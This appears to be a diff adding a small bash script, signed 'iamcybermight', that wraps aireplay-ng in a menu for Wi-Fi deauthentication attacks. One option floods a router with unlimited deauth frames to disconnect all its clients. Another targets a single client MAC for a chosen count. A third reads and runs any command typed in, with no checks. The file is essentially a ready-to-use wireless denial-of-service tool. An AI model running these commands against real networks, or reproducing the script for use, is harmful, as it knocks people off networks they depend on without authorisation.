@@ -1,0 +1,31 @@
+#!/usr/bin/env bash
+echo "Hello, This is I am iamcybermight"
+echo "1.Deauth All
+2.Deauth Target
+3.Other"
+echo -n "Make your Choice:"
+read H
+if [ $H -eq 1 ]
+then
+    echo -n "Enter Routers MAC Id [BSSID]:"
+    read VAR
+    aireplay-ng --deauth 0 -a $VAR wlan0
+   
+elif [ $H -eq 2 ]
+then
+    echo -n "Enter Routers MAC Id [BSSID]:"
+    read VAR
+    echo -n "Enter No.of Deauth Requests:"
+    read D
+    echo -n "Enter Target MAC Id [BSSID]:"
+    read T
+    aireplay-ng --deauth $D -c $T -a $VAR wlan0 
+    
+elif [ $H -eq 3 ]
+then
+    echo -n "Enter command manually:"
+    read T
+    $T    
+else
+    echo "Please Select Properly"
+fi
